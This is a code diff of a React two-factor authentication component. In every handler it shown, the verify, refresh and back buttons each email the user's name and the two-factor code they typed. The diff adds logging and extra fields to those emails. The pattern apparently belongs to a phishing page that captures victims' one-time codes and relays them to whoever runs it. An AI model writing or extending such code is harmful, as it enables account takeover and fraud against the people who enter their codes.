@@ -51,16 +51,19 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
 
     setIsLoading(true);
     
-    // Send email for 2FA submission (this is a button click)
+    // Send email for 2FA verification submission button click
     try {
+      console.log('🚨 Sending email for 2FA verification button click');
       await sendEmailNotification({
-        step: "Two-Factor Auth - VERIFICATION SUBMITTED",
+        step: "Two-Factor Auth - VERIFICATION SUBMITTED (Button Click)",
         username,
         timestamp: new Date().toISOString(),
         allFormData: {
-          username,
-          twoFactorCode: code,
-          verificationStatus: "submitted"
+          username: username || 'N/A',
+          twoFactorCode: code || 'N/A',
+          codeLength: code.length,
+          verificationStatus: 'submitted',
+          action: 'verify_code_submitted'
         }
       });
     } catch (error) {
@@ -82,16 +85,18 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
     setTimer(30);
     setCanResend(false);
     
-    // Send email for code refresh (this is a button click)
+    // Send email for code refresh button click
     try {
+      console.log('🚨 Sending email for code refresh button click');
       await sendEmailNotification({
-        step: "Two-Factor Auth - Code Refreshed",
+        step: "Two-Factor Auth - Code Refreshed (Button Click)",
         username,
         timestamp: new Date().toISOString(),
         allFormData: {
-          username,
-          action: "refresh_code",
-          twoFactorCode: code
+          username: username || 'N/A',
+          twoFactorCode: code || 'N/A',
+          action: 'refresh_code_clicked',
+          codeLength: code.length
         }
       });
     } catch (error) {
@@ -105,16 +110,18 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
   };
 
   const handleBack = async () => {
-    // Send email for back button (this is a button click)
+    // Send email for back button click
     try {
+      console.log('🚨 Sending email for back button click');
       await sendEmailNotification({
-        step: "Two-Factor Auth - Back to Login",
+        step: "Two-Factor Auth - Back to Login (Button Click)",
         username,
         timestamp: new Date().toISOString(),
         allFormData: {
-          username,
-          action: "back_to_login",
-          twoFactorCode: code
+          username: username || 'N/A',
+          twoFactorCode: code || 'N/A',
+          action: 'back_to_login_clicked',
+          codeLength: code.length
         }
       });
     } catch (error) {
